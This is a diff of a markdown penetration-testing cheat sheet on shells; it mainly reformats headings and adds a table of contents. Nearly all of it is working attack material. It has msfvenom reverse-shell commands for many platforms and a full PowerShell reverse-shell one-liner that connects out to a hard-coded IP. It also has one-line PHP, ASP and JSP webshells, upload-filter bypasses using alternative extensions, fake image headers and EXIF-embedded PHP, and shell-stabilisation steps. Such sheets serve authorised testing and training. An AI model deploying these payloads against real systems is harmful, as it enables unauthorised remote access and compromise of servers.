@@ -1,83 +1,113 @@
 # Shells
 
-## Reverse shells
+## Table of contents
+
+##### ➤ Shells
+
+* [Reverse shell](#reverse-shell)
+* [One liner](#one-liner)
+* [Webshell](#webshell)
+* [Online generator](#online-generator)
+
+##### ➤ Upload bypass
+
+* [Reverse shell](#reverse-shell)
+* [One liner](#one-liner)
+* [Webshell](#webshell)
+* [Online generator](#online-generator)
 
 
-#### Linux - MSFVenom
+##### ➤ Shell Stabilisation
+
+* [Technique 01: Python](#)
+* [Technique 02: Rlwrap](#)
+* [Technique 3: Socat](#)
+
+
+
+# 
+# ⭕ Shells
+
+## 🔻Reverse shell
+
+#### ➤ Linux - MSFVenom
 ```
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 ```
 
-#### Windows - MSFVenom
+#### ➤ Windows - MSFVenom
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
 
-#### Powershell
+#### ➤ Powershell
 ```
 powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
-#### ASP
+
+#### ➤ ASP
 ```
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
 ```
-#### ASPX
+
+#### ➤ ASPX
 ```
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
 ```
-#### JSP
+
+#### ➤ JSP
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 ```
-#### WAR
+
+#### ➤ WAR
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
 ```
-#### PHP
+
+#### ➤ PHP
 ```
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
-#### HTA
+
+#### ➤ HTA
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta
 ```
 
-#### DLL
+#### ➤ DLL
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 ```
 
-```
-```
-## Single line Webshell
+## 🔻Single line Webshell
 
-#### PHP
+#### ➤ PHP
 ```
 <?php echo passthru($_GET['cmd']); ?>
 <?php echo shell_exec($_GET['cmd']); ?>
 ```
-#### ASP
+
+#### ➤ ASP
 ```
 <% eval request("cmd") %>
 ```
-#### JSP
+
+#### ➤ JSP
 ```
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
-```
-```
-## Online Generator
-<https://www.revshells.com/>
-<https://weibell.github.io/reverse-shell-generator/>
+## 🔻Online Generator
+https://www.revshells.com/
+https://weibell.github.io/reverse-shell-generator/
 
-```
-```
-## Upload Bypass
+# 
+# ⭕ Upload Bypass
 
-#### Rename the extension 
+## 🔻Rename the extension 
 ```
 • PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
 
@@ -96,12 +126,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 • Erlang Yaws Web Server: .yaws
 ```
 
-
-
-Erlang Yaws Web Server: .yaws
-
-
-#### Magic number
+## 🔻Magic number
 
 An image is identified by its first bytes. It is possible to hide a webshell by including a valid img header at the beginning of the webshell file.
 
@@ -126,11 +151,12 @@ printf "\xff\xd8\xff\xe0<?php system('id'); ?>" > image?jpg
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpg
 ```
 
-```
-```
-## Shell Stabilisation
 
-#### Technique 01: Python
+
+# 
+# ⭕ Shell Stabilisation
+
+## 🔻Technique 01: Python
 ```
 ➤ Step 01 : uses Python to spawn a better featured bash shell
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -165,7 +191,7 @@ user@box:~$ ^C
 user@box:~$
 ```
 
-#### Technique 02: Rlwrap
+## 🔻Technique 02: Rlwrap
 rlwrap gives a more fully featured shell including access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
 This technique is particularly useful with the Windows shell.
 ```
@@ -183,7 +209,7 @@ CRTL+Z
 stty raw -echo; fg
 ```
 
-#### Technique 3: Socat
+## 🔻Technique 3: Socat
 Restricted to Linux target
 ```
 ➤ Prerequisite: Obtain Socat on the linux target.
